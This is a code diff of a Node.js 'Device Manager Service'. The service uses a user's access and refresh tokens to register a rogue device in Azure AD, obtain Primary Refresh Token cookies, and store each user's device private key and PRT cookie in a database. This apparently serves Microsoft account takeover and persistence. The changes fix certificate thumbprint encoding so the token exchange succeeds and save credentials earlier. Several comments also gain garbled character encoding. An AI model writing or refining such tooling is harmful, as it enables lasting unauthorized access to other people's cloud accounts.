@@ -1,5 +1,5 @@
 /**
- * VGenius C Engine – Device Manager Service
+ * VGenius C Engine â€“ Device Manager Service
  * Handles Azure AD Device Registration (DRS) and PRT generation
  */
 const axios = require('axios');
@@ -92,7 +92,7 @@ function inspectJwt(jwtString) {
 
 /**
  * Best-effort extraction of tenant_id and target_domain from an access token JWT.
- * Returns { tenantId, targetDomain, upn, exp, iss, sub } — any field may be null.
+ * Returns { tenantId, targetDomain, upn, exp, iss, sub } â€” any field may be null.
  */
 function extractTenantFromAccessToken(accessToken) {
   const claims = inspectJwt(accessToken);
@@ -209,7 +209,7 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
   const deviceId = data.User?.ObjectId || data.User?.deviceId || data.User?.id;
   const registrationTenantId = tenantId;
   let certificateThumbprint = null;
-  let certificateDerBase64 = null; // Original DER base64 from DRS response — must preserve for x5c
+  let certificateDerBase64 = null; // Original DER base64 from DRS response â€” must preserve for x5c
 
   // Inspect the raw certificate format before normalization
   try {
@@ -252,7 +252,7 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
         if (typeof rawBody === 'string' && rawBody.length > 0) {
           try {
             const derBuffer = Buffer.from(rawBody, 'base64');
-            // Store the original DER base64 for use in x5c — critical for AAD
+            // Store the original DER base64 for use in x5c â€” critical for AAD
             certificateDerBase64 = rawBody;
             // 'binary' (Latin-1) preserves every raw byte; plain toString() is UTF-8 and corrupts DER
             const cert = forge.pki.certificateFromAsn1(forge.asn1.fromDer(derBuffer.toString('binary')));
@@ -412,7 +412,7 @@ function buildClientAssertion(privateKeyPem, deviceId, audience, certificatePem,
   }
 
   // FALLBACK: If we don't have the original DER base64, try PEM round-trip
-  // (less reliable — may produce wrong thumbprint)
+  // (less reliable â€” may produce wrong thumbprint)
   if (!derBase64 && certificatePem && certificatePem.includes('BEGIN CERTIFICATE')) {
     try {
       const cert = forge.pki.certificateFromPem(certificatePem);
@@ -444,8 +444,9 @@ function buildClientAssertion(privateKeyPem, deviceId, audience, certificatePem,
   }
 
   header.kid = thumbprint;
-  header.x5t = thumbprint;
-  if (sha256Thumb) header['x5t#S256'] = sha256Thumb;
+  const sha1Buf = Buffer.from(thumbprint, 'hex');
+  header.x5t = sha1Buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+  if (sha256Thumb) { const sha256Buf = Buffer.from(sha256Thumb, 'hex'); header['x5t#S256'] = sha256Buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); }
   header.x5c = [derBase64];
 
   const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64url');
@@ -562,7 +563,7 @@ async function getPrtCookie(clientAssertion, refreshToken, tenantId) {
  *
  * tokenData:
  *   access_token, refresh_token, tenant_id, user_id, target_domain
- *   inMemory (bool, default false) — when true, forces a fresh DRS registration
+ *   inMemory (bool, default false) â€” when true, forces a fresh DRS registration
  *     even if stored credentials exist for the same user_id + tenant_id. Used by
  *     the admin Device Test panel to avoid mutating a real user's stored state.
  */
@@ -661,7 +662,26 @@ async function registerDeviceAndGetPrt(tokenData) {
     console.error('[DeviceManager] DRS registration failed:', err.message);
     throw new Error(`Device registration failed: ${err.message}`);
   }
-  // Step 4: Build client assertion with correct audience for tenant
+  // Step 4: Store device credentials IMMEDIATELY after DRS succeeds
+  // This ensures the certificate and private key are persisted even if PRT exchange fails
+  if (user_id && tenant_id) {
+    try {
+      await storeDeviceCredentials({
+        deviceId: registrationResult.deviceId,
+        deviceCertificate: registrationResult.deviceCertificate,
+        certificateThumbprint: registrationResult.certificateThumbprint || null,
+        certificateDerBase64: registrationResult.certificateDerBase64 || null,
+        prtCookie: null, // PRT not yet available
+        privateKey: privateKeyPem,
+        tenantId: tenant_id
+      }, user_id, null);
+      console.log('[DeviceManager] Device credentials stored (PRT pending)');
+    } catch (storeErr) {
+      console.error('[DeviceManager] Failed to store device credentials:', storeErr.message);
+    }
+  }
+
+  // Step 5: Build client assertion with correct audience for tenant
   const assertionAudience = `https://login.microsoftonline.com/${tenant_id || 'common'}/oauth2/v2.0/token`;
   const drsThumbprint = registrationResult.certificateThumbprint || null;
   const drsDerBase64 = registrationResult.certificateDerBase64 || null;
@@ -677,6 +697,19 @@ async function registerDeviceAndGetPrt(tokenData) {
   } catch (err) {
     console.error('[DeviceManager] PRT exchange failed:', err.message);
     throw new Error(`PRT cookie exchange failed: ${err.message}`);
+  }
+
+  // Step 6: Update stored PRT cookie if we stored credentials above
+  if (user_id && tenant_id) {
+    try {
+      await db.query(
+        'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW(), updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
+        [encrypt(prtCookie), user_id, tenant_id]
+      );
+      console.log('[DeviceManager] PRT cookie updated in storage');
+    } catch (updateErr) {
+      console.error('[DeviceManager] Failed to update stored PRT cookie:', updateErr.message);
+    }
   }
 
   return {
@@ -701,7 +734,7 @@ async function storeDeviceCredentials(credentials, userId, userPrincipalName) {
     err.code = 'MISSING_STORAGE_KEY';
     throw err;
   }
-  if (!deviceId || !deviceCertificate || !prtCookie || !privateKey) {
+  if (!deviceId || !deviceCertificate || !privateKey) {
     const err = new Error('storeDeviceCredentials received incomplete credentials: ' +
       JSON.stringify({
         hasDeviceId: !!deviceId,
@@ -714,7 +747,7 @@ async function storeDeviceCredentials(credentials, userId, userPrincipalName) {
   }
 
   const encryptedPrivateKey = encrypt(privateKey);
-  const encryptedPrtCookie = encrypt(prtCookie);
+  const encryptedPrtCookie = prtCookie ? encrypt(prtCookie) : null;
   const encryptedCertificate = encrypt(deviceCertificate);
   const encryptedDerBase64 = certificateDerBase64 ? encrypt(certificateDerBase64) : null;
 
@@ -822,7 +855,7 @@ async function listStoredCredentials() {
 
 /**
  * Delete a stored device_credentials row.
- * Deletes by (user_id, tenant_id) composite key — the natural identifier.
+ * Deletes by (user_id, tenant_id) composite key â€” the natural identifier.
  *
  * @returns {boolean} true if a row was deleted, false if nothing matched.
  */
